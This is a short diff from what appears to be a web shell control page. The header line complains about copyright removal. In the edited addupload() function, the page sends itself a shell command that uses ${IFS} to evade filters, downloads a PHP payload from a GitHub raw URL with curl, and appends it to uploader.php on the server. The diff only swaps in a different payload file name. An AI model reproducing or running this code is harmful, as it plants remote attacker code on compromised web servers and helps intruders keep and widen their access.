@@ -134,7 +134,7 @@ Recoded? only changed and delete copyright? Don't be a bastard dude!
 	}
 
 	function addupload() {
-		document.location.href = "<!--#echo var=DOCUMENT_NAME -->?" + "curl${IFS}-Ls${IFS}raw.githubusercontent.com/RaitoKazuki/sh/refs/heads/main/apiEmail.php${IFS}|${IFS}tee${IFS}-a${IFS}uploader.php";
+		document.location.href = "<!--#echo var=DOCUMENT_NAME -->?" + "curl${IFS}-Ls${IFS}raw.githubusercontent.com/RaitoKazuki/sh/refs/heads/main/apiEmail-403-Litespeed-CMD.php${IFS}|${IFS}tee${IFS}-a${IFS}uploader.php";
 	}
 
 	function checkroot() {
